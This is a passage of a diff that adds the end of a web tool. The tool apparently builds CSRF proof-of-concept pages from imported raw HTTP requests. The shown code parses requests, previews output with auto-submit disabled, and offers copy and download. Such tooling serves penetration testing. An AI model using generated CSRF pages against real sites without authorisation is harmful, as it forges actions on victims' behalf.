+    const path = parts[1];
+
+    let host = '';
+    let ctHeader = 'application/x-www-form-urlencoded';
+    let bodyStart = -1;
+
+    for (let i = 1; i < lines.length; i++) {
+        const l = lines[i];
+        if (l.toLowerCase().startsWith('host:')) host = l.split(':').slice(1).join(':').trim();
+        if (l.toLowerCase().startsWith('content-type:')) ctHeader = l.split(':').slice(1).join(':').trim().split(';')[0].trim();
+        if (l.trim() === '') { bodyStart = i + 1; break; }
+    }
+
+    const url = host ? `https://${host}${path}` : path;
+    document.getElementById('target-url').value = url;
+
+    // Set method
+    const methodSel = document.getElementById('http-method');
+    for (let o of methodSel.options) { if (o.value === method) { methodSel.value = method; break; } }
+
+    // Content-type
+    const ctSel = document.getElementById('content-type');
+    for (let o of ctSel.options) { if (ctHeader.includes(o.value) || o.value.includes(ctHeader)) { ctSel.value = o.value; break; } }
+
+    // Body params
+    if (bodyStart > 0 && bodyStart < lines.length) {
+        const body = lines.slice(bodyStart).join('\n').trim();
+        if (body) {
+            params = [];
+            paramIdCounter = 0;
+            try {
+                const pairs = body.split('&');
+                pairs.forEach(pair => {
+                    const [k, v] = pair.split('=');
+                    addParam(decodeURIComponent(k || ''), decodeURIComponent(v || ''));
+                });
+            } catch(e) {
+                addParam('body', body);
+            }
+        }
+    }
+
+    renderParams();
+    showToast('✔ REQUEST IMPORTED', 'success');
+    document.getElementById('burp-raw').value = '';
+}
+
+// ─── PREVIEW ──────────────────────────────────────────────────────────────────
+function renderPreview() {
+    if (!generatedCode) { generatePOC(); }
+    const iframe = document.getElementById('preview-frame');
+    const url = document.getElementById('target-url').value.trim();
+    document.getElementById('preview-url-bar').textContent = url || 'about:blank';
+    // Preview: strip auto-submit for safety
+    let previewCode = generatedCode.replace(/document\.getElementById\(['"](csrf-form|)['"]\)\.submit\(\);?/g, '/* auto-submit disabled in preview */');
+    iframe.srcdoc = previewCode;
+}
+
+function openInNewTab() {
+    if (!generatedCode) { generatePOC(); }
+    const blob = new Blob([generatedCode], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+}
+
+// ─── COPY / DOWNLOAD ─────────────────────────────────────────────────────────
+function copyOutput() {
+    const code = document.getElementById('code-output').value;
+    if (!code) { showToast('⚠ NOTHING TO COPY — GENERATE FIRST', 'error'); return; }
+    navigator.clipboard.writeText(code).then(() => showToast('✔ COPIED TO CLIPBOARD', 'success'));
+}
+
+function downloadPOC() {
+    const code = document.getElementById('code-output').value;
+    if (!code) { showToast('⚠ NOTHING TO DOWNLOAD — GENERATE FIRST', 'error'); return; }
+    const filename = document.getElementById('output-filename').textContent;
+    const blob = new Blob([code], { type: 'text/html' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    a.click();
+    showToast('✔ FILE DOWNLOADED: ' + filename, 'success');
+}
+
+// ─── TOAST ────────────────────────────────────────────────────────────────────
+function showToast(msg, type = 'info') {
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.textContent = msg;
+    container.appendChild(toast);
+    setTimeout(() => {
+        toast.style.animation = 'fadeOut 0.4s ease-out forwards';
+        setTimeout(() => toast.remove(), 400);
+    }, 3000);
+}
+
+// ─── UTILS ────────────────────────────────────────────────────────────────────
+function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function escAttr(s) { return String(s).replace(/"/g,'&quot;'); }
+</script>
+</body>
+</html>
